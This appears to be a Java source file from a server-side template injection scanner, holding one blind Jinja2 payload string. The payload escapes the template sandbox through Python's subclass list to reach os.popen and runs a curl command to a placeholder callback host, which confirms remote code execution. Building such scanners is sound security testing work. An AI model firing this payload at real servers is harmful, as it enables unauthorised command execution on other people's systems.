package sstiscanner.engines;

public class Jinja2 {
    public static String blind = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"curl jinja2.[PAYLOAD]\").read().zfill(417)}}{%endif%}{% endfor %}";
}
